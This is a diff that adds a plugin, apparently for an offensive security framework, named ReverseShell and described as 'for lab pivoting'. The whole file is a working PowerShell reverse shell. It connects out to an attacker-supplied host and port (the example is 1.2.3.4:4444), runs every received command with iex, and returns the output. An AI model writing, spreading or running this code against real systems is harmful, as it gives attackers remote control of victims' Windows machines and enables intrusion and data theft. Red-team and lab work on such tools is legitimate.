@@ -1,0 +1,19 @@
+# plugin.name: ReverseShell
+# plugin.description: A PowerShell reverse shell for lab pivoting
+# plugin.lang: powershell
+# plugin.ositworkswith: windows
+# plugin.commands: /plugin use ReverseShell LHOST=1.2.3.4 LPORT=4444
+# plugin.args: LHOST:str LPORT:int
+
+$client = New-Object System.Net.Sockets.TCPClient($args[0], $args[1])
+$stream = $client.GetStream()
+[byte[]]$bytes = 0..65535|%{0}
+while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
+    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
+    $sendback = (iex $data 2>&1 | Out-String )
+    $sendback2  = $sendback + 'PS ' + (pwd).Path + '> '
+    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
+    $stream.Write($sendbyte,0,$sendbyte.Length)
+    $stream.Flush()
+}
+$client.Close()
